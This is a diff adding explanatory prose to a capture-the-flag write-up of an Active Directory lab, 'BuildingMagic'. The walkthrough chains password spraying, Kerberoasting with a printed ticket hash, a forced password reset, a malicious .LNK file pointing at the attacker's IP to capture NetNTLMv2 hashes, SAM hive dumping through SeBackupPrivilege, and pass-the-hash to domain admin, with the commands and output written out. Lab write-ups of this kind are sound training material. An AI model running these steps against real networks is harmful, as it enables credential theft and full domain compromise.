@@ -33,6 +33,7 @@ id	username	full_name	role		password
 ## Initial Recon
 
 ### Nmap Scan
+I always start with a simple `nmap` scan:
 ```bash
 nmap 10.0.29.68
 
@@ -59,6 +60,8 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
 ```
+The scan shows the usual `AD` ports open, plus a web server is running.
+Then, I go for an aggressive scan (`-A`) against the open ports:
 ```bash
 nmap -A -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,8080 10.0.29.68 -o nmap-scan.log
 
@@ -123,11 +126,14 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 83.15 seconds
 ```
+The web server is just the default Microsoft IIS server page.
 
 ---
 
 ## Hash Cracking
 
+We were given a leaked database file with potential usernames and password hashes.
+The go-to utility for me when cracking hashes is [CrackStation](crackstation.net):
 ![image1.png](bm-images/image1.png)
 
 Successful cracks:
@@ -137,6 +143,7 @@ Successful cracks:
 
 ## Identifying Valid Credentials
 
+I've got a list of potential usernames:
 ```bash
 cat users.txt
 
@@ -151,6 +158,7 @@ b.builder
 t.ren
 e.macmillan
 ```
+I did a password spray against the list of usernames with the pair of cracked password hashes and identified valid credentials:
 ```bash
 nxc smb 10.0.29.68 -u users.txt -p 'lilronron'
 
@@ -163,6 +171,8 @@ SMB         10.0.29.68      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.wi
 
 ## SMB Enumeration
 
+One of the first things I usually do when solving AD labs is enumerate SMB.
+First, I check for guest / anonymous login. This time around, I discovered valid domain creds, so I went with that:
 ```bash
 nxc smb 10.0.29.68 -u r.widdleton -p 'lilronron' --shares
 
@@ -178,12 +188,15 @@ SMB         10.0.29.68      445    DC01             IPC$            READ        
 SMB         10.0.29.68      445    DC01             NETLOGON                        Logon server share 
 SMB         10.0.29.68      445    DC01             SYSVOL                          Logon server share
 ```
+Nothing interesting found.
 
 ---
 
 ## Domain Enumeration
 
+The next step is to enumerate the domain.
 ### Users
+First, I use `netexec` to enumerate domain users:
 ```bash
 nxc ldap buildingmagic.local -u r.widdleton -p 'lilronron' --users
 
@@ -202,6 +215,7 @@ LDAP        10.0.29.68      389    DC01             a.flatch                    
 ```
 
 ### Domain
+Before using `BloodHound` for enumerating the domain, I like to use `ldapdomaindump`. Just a personal choice, you can go straight to `BloodHound`:
 ```bash
 ldapdomaindump -u buildingmagic.local\\'r.widdleton' -p 'lilronron' dc01.buildingmagic.local
 
@@ -221,12 +235,14 @@ domain_computers.html        domain_groups.html     domain_policy.html  domain_t
 open domain_users.html
 ```
 ![image2.png](bm-images/image2.png)
+Looking at the domain users and groups, I get a rough idea of the attack path.
 
 ---
 
 ## Exploitation & Lateral Movement
 
 ### Attack: Kerberoasting
+I identified a `ServicePrincipalName` (SPN) associated with the `r.haggard` user, so I'll attempt `keberoasting`:
 ![image3.png](bm-images/image3.png)
 ```bash
 nxc ldap buildingmagic.local -u r.widdleton -p 'lilronron' --kerberoasting output.txt
@@ -237,20 +253,25 @@ LDAP        10.0.29.68      389    DC01             [*] Total of records returne
 LDAP        10.0.29.68      389    DC01             [*] sAMAccountName: r.haggard, memberOf: [], pwdLastSet: 2025-05-16 02:09:04.002067, lastLogon: 2025-05-16 03:34:51.644710
 LDAP        10.0.29.68      389    DC01             $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL\r.haggard*$b0809977dfeed72c3f6e3e1da2afc1a2$c06db97d7ed5cde027a6ec44c68fc591bc65785073ae10eb97d2b11c712957be9d8cf76aca5101345c9b31b2fad8883a88e9a6f8c7fc14b4379291ae73dfe6ec4a7626402970e97ca70669c2c3ad3eeb12827d0a55310ae2b04ec321f7e9fa00cf4065d12e0e3e409cae7561609704598a0e4fb9f70d2ac395bb744efcbb3b8bb335b228c830f7c7d7a281a7c638bcc8f2dcab925c4b8da3f7d22b37b92931a2b6e2c3f2d16a1ed76a5b61c2e091c60b6c83eb5453b43989b0043700e81548c2916e4f9c2da48fcb80a8aeef0fa7dcd26b7189bd38e135485aa4f9e9088a7d1e15e2d4c8ac724737844410eed4a5b327fd4b362df24e0ad11400e7aaaf23088d7ff1452c235672469d3e65ddb68f05acdd60fccd3a67b29ab0d228306166f2f658d1879ce496d68e157e2aecaead9dc5cba05085b5f1739992c021b87206b9571e4ac08c904c5208e6739ecb8ce02ccf62b01021686e5442a61b2299e5bae6c778d4e84187d66289c32df9561c6cbdac683c3ea657c4e9d4c73ed4017bb8a246769380b022151a3f5497a44867247e09b2ded931e7136d4e1831979e7347026eca800320e371a85ff7df9708fd8daec0f30336be13835af4e3e1d342b4166dc439ff7c3a59e20c4fc90d3dc291b7e2c28b963032a931040bc3d728032c9bb6aed1f107d705f225a820e973aab6be4f0f0b09222c9582807dd6abc836a5631c55e2ee7c2e71e0daab8982c3afa8bfe0824dcd34ce189f93e6b5980b0a7b5c500746a378557d8f35c2ebc3570179f067e02690dd0e0db7140a8fec2d2a0dcca3067aaba4fddf52ce0e096e26104e5e86197874c7912409fcd7f3df175884eebc0209a97af09cc8d27abfcd8db87dc9c5f63a7567d8833c31bfb748221d7e28667fdfd1b6a61ec72be9f0f26c168ad1d7bb569f0cf01d0c6cb3cf50c8f3ef488bcc5abf723e10f3368ad4e2dafbe5349dbf1d34bd82a22be997294eb72fca232b51d1db048470821e4130293f70267beb6d6292f9ee997e1cd326dad7540243d627f176c6c250d9ca6309f321117086a96fcdc8f7106b5c603dd4f8e337610e78fb1565d6bea64f7c05190421a195178ebd074fbb0c3af2caef1f939aaf76d697a5cdcd785ec6a567da1de24722d3a2705341a8bab7a42eed51308d305b1fe3980010425252a6f5059e13ca9bd3809fc094a20a8ab9aa04e28e3b1c28d74f9cbbb8c43746c9a263cbb16f2d524d5574fe47be6a1cfc41fe21b3e304f6b1125fa4e8a2f0303c14dc58a9e049982d5fdd464dad102e339082307ddf3ee041841a73c05e3aac1a8d786c628630bd5e31e9021d5fd5e942370a2b6b57eb44cee45a15bcbb6fc60d5bcbe60c369b615e86b313b9eadd5ac6aa119dcaf05c58294b48a06e6f240c27aaebcac500a5d37374afa49fc161f1ff969bb18babb01d8ca647b261c113032f581e2c531af0a50240c18c2907127571f21d575d54ffff713ddfff3a518ea392ac238ce8937c956e6e323b50dfdf64049b638cf9e99d4c02c135f6af08be53762a2e5473dced4ca88b1523
 ```
+Got the `krb5tgs` hash for the `r.haggard` user.
 
 ### Hash Cracking
+Using `hashcat` to crack the hash:
 ```bash
 hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt
 ```
+Another user compromised!
 `r.haggard:rubeushagrid`
 
 ### Compromising the `h.potch` User
-- The `r.haggard` user has an outbound object control (change password) over the `h.potch` user.
+The `r.haggard` user has an outbound object control (change password) over the `h.potch` user.
+I used `bloodyAD` to change the password of the `h.potch` user:
 ```bash
 bloodyAD -d buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' --dc-ip 10.0.29.68 set password h.potch 123456  
 [+] Password changed successfully!
 ```
 `h.potch:123456`
+Enumerating the SMB shares as the `h.potch` user, I identified a writable share:
 ```bash
 nxc smb 10.0.29.68 -u h.potch -p '123456' --shares
 
@@ -269,6 +290,7 @@ SMB         10.0.29.68      445    DC01             SYSVOL          READ        
 > We've discovered a writable share.
 
 ### .LNK File Attack
+I used `netexec`'s `slinky` module to generate a malicious `.LNK` file and write it to the share:
 ```bash
 nxc smb 10.0.29.68 -u h.potch -p '123456' -M slinky -o name=hello server=10.200.24.233
 
@@ -286,12 +308,14 @@ SMB         10.0.29.68      445    DC01             SYSVOL          READ        
 SLINKY      10.0.29.68      445    DC01             [+] Found writable share: File-Share
 SLINKY      10.0.29.68      445    DC01             [+] Created LNK file on the File-Share share
 ```
+How this works is that the `.LNK` file is rendered to point to a path, which is the IP address of the attacker. When a user accesses the share, the Windows Explorer tries to render the path of that file, and to do that, it connects to the attacker's IP. For authentication, Windows sends the NetNTLMv2 hash of the user to the attacker.
 ```bash
 sudo responder -I tun0 -dP
 ```
-- Using responder we caught the hash of the user `h.grangon`.
+Using `responder`, we caught the hash of the user `h.grangon`.
 
 ### Hash Cracking
+Again, using hashcat to crack the hash:
 ```bash
 hashcat -m 13100 output2.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -300,6 +324,7 @@ hashcat -m 13100 output2.txt /usr/share/wordlists/rockyou.txt
 > The `h.grangon` user is a member of the Remote Management Users group.
 
 ### Initial System Access
+I get a remote session of the target as the `h.grangon` user, using `evil-winrm`:
 ```bash
 evil-winrm -i 10.0.29.68 -u h.grangon                                                
 Enter Password: 
@@ -315,6 +340,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 ### Get user.txt
+Got `user.txt`:
 ```bash
 C:\Users\h.grangon\Desktop> dir
 
@@ -337,6 +363,7 @@ Mode                 LastWriteTime         Length Name
 ## Domain Compromise
 
 ### Abusing a Privilege
+To elevate my privileges, I first look at the privileges assigned to the `h.grangon` user:
 ```bash
 C:\Users\h.grangon\Desktop> whoami /all
 
@@ -382,8 +409,10 @@ User claims unknown.
 
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
-- The user has `SeBackupPrivilege` enabled.
+The user has `SeBackupPrivilege` enabled.
+You can learn more about this privilege and how to exploit it, here: [SeBackupPrivilege](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
 
+I used this privilege to back up the SAM & SYSTEM registry hives:
 ```bash
 mkdir C:\temp
 reg save hklm\sam C:\temp\sam.hive
@@ -398,8 +427,9 @@ Info: Download successful!
 Info: Downloading C:\temp\system.hive to system.hive
 Info: Download successful!
 ```
-- Use the `impacket-secretsdump` from the `impacket` library to dump the NTLM hashes.
+Transferred the backup files to my system.
 
+Then I used the `impacket-secretsdump` from the `impacket` library to dump the NTLM hashes.
 ```bash
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 
@@ -412,6 +442,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
 ```
+Identified the hash is of the `a.flatch` user, which is a domain admin:
 ```bash
 nxc smb 10.0.29.68 -u users.txt -H "520126a03f5d5a8d836f1c4f34ede7ce"
 
@@ -425,6 +456,7 @@ SMB         10.0.29.68      445    DC01             [+] BUILDINGMAGIC.LOCAL\a.fl
 ```
 
 ### Get root.txt
+Using the `PassTheHash` attack, I got a remote session of the DC:
 ```bash
 evil-winrm -i 10.0.29.68 -u "a.flatch" -H "520126a03f5d5a8d836f1c4f34ede7ce"
                                         
@@ -453,3 +485,4 @@ d-----         6/12/2025   1:37 PM                nssm-2.24
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
 9557e65743416c******************
 ```
+Got the `root.txt` flag.
